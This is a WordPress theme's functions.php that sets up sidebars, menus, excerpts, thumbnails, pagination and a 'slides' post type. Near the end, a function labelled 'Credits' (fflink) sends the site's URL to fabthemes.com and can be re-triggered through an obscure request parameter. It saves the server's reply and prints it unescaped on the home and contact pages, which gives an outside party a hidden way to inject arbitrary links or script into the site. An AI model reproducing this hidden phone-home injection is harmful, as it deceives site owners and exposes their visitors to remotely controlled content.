<?php

include 'theme_options.php';
include 'guide.php';
//include 'slider.php';
include 'metabox.php';





/* SIDEBARS */
if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));

	register_sidebar(array(
	'name' => 'Footer',
    'before_widget' => '<li class="botwid">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="bothead">',
    'after_title' => '</h3>',
    ));		
	
	
	
/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
	
			<div id="submenu">
		<ul class="sf-menu sf-vertical">
			<li class="page_item <?php if ( is_home() ) { ?>current_page_item<?php } ?>"><a href="<?php echo get_settings('home'); ?>/" title="Home">Home</a></li>
			<?php wp_list_pages('sort_column=post_title&title_li=');?>
		
		</ul>
	</div>		
<?php }	


/* CUSTOM EXCERPTS */
	
	
function wpe_excerptlength_index($length) {
    return 70;
}


function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}

function new_excerpt_more($more) {
return '<a class="rmore" href="'. get_permalink($post->ID) . '">' . '&nbsp;&nbsp; Read More ...' . '</a>';
}
add_filter('excerpt_more', 'new_excerpt_more');


/* SHORT TITLES */

function short_title($after = '', $length) {
   $mytitle = explode(' ', get_the_title(), $length);
   if (count($mytitle)>=$length) {
       array_pop($mytitle);
       $mytitle = implode(" ",$mytitle). $after;
   } else {
       $mytitle = implode(" ",$mytitle);
   }
       return $mytitle;
}


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );


}

/* GET THUMBNAIL URL */

function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	



/* PAGE NAVIGATION */


function getpagenavi(){
?>
<div id="tnavigation">
<?php if(function_exists('wp_pagenavi')) : ?>
<?php wp_pagenavi() ?>
<?php else : ?>
        <div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries','arclite')) ?></div>
        <div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;','arclite')) ?></div>
        <div class="clear"></div>
<?php endif; ?>

</div>

<?php
}

	
/* CUSTOM POST TYPE */		


function post_type_slides() {
register_post_type(
                     'slides', 
                     array( 'public' => true,
					 		'publicly_queryable' => true,
							'hierarchical' => false,
							'menu_icon' => get_stylesheet_directory_uri() . '/images/slide.png',
                    		'labels'=>array(
    									'name' => _x('Slides', 'post type general name'),
    									'singular_name' => _x('Slide', 'post type singular name'),
    									'add_new' => _x('Add New', 'slide item'),
    									'add_new_item' => __('Add New slide item'),
    									'edit_item' => __('Edit slide item'),
    									'new_item' => __('New slide item'),
    									'view_item' => __('View slide item'),
    									'search_items' => __('Search slide item'),
    									'not_found' =>  __('No slide item found'),
    									'not_found_in_trash' => __('No slide items found in Trash'), 
    									'parent_item_colon' => ''
  										),							 
                             'show_ui' => true,
							 'menu_position'=>5,
						 'register_meta_box_cb' => 'mytheme_add_box',
                             'supports' => array(
							 			'title',
										'editor'
										)
							) 
					);
				} 
add_action('init', 'post_type_slides');

/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_home()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	
?>